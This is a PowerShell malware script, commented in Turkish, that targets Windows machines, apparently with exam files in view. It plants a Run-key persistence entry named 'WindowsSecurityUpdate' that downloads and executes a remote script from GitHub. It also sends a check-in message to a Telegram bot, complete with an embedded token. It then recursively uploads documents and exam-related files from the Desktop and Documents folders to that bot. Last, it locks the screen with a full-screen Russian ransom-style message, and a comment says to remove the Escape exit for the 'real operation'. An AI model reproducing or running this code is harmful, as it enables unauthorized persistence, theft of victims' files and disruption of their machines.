# --- AYARLAR (0xffbadboy Edition) ---
$botToken = "7963651435:AAEwnINCDTKPfNi4nTns-7pykoSaBWIC05M"
$chatId = "7036117225"
$userName = "0xffbadboy"
$repoName = "rootkit"
$deepPath = "C:\Program Files (x86)\Common Files\Microsoft Shared\fsociety\rootkit"
$logoUrl = "https://raw.githubusercontent.com/$userName/$repoName/main/logo.png"

# --- 1. ADIM: REPO COPY & KALICILIK (PERSISTENCE) ---
# Bilgisayar her açıldığında kodun senin GitHub'ından tetiklenmesi
$runKey = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$payload = "powershell -W Hidden -Exec Bypass -Command IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/$userName/$repoName/main/master.ps1')"
Set-ItemProperty -Path $runKey -Name "WindowsSecurityUpdate" -Value $payload

# --- 2. ADIM: GİZLİ KLASÖR VE LOGO ---
if (!(Test-Path $deepPath)) { New-Item -Path $deepPath -ItemType Directory -Force }
try { Invoke-WebRequest -Uri $logoUrl -OutFile "$deepPath\logo.png" -ErrorAction SilentlyContinue } catch {}

# --- 3. ADIM: LOOT (SINAV DOSYALARINI SIZDIRMA) ---
$msg = "🇷🇺 [ОБЪЕКТ ПОДКЛЮЧЕН]: $($env:COMPUTERNAME) | ХАКНУТО: $userName"
Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendMessage" -Method Post -Body @{chat_id=$chatId; text=$msg}

$formats = @("*.pdf*", "*.docx*", "*.xlsx*", "*sinav*", "*soru*", "*cevap*")
Get-ChildItem -Path "$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop" -Include $formats -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
    try {
        $uri = "https://api.telegram.org/bot$botToken/sendDocument?chat_id=$chatId"
        Invoke-RestMethod -Uri $uri -Method Post -Form @{document=Get-Item $_.FullName}
    } catch {}
}

# --- 4. ADIM: RUSÇA KİLİT EKRANI (LOCK) ---
Add-Type -AssemblyName System.Windows.Forms
$form = New-Object System.Windows.Forms.Form
$form.StartPosition = "Manual"
$form.Location = New-Object System.Drawing.Point(0,0)
$form.Size = New-Object System.Drawing.Size([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height)
$form.FormBorderStyle = "None"
$form.BackColor = "Black"
$form.TopMost = $true

$label = New-Object System.Windows.Forms.Label
$label.Text = "ВНИМАНИЕ! СИСТЕМА ЗАБЛОКИРОВАНА`n`nХАКНУТО: $userName`n`nЭКЗАМЕНЫ ОТМЕНЕНЫ"
$label.Font = New-Object System.Drawing.Font("Consolas", 32, [System.Drawing.FontStyle]::Bold)
$label.ForeColor = "Red"
$label.TextAlign = "MiddleCenter"
$label.Dock = "Fill"
$form.Controls.Add($label)

# Çıkış tuşu (Test için: ESC tuşuna basınca kapanır. Gerçek operasyonda bu satırı silebilirsin)
$form.Add_KeyDown({if ($_.KeyCode -eq "Escape") {$form.Close()}})

$form.ShowDialog()
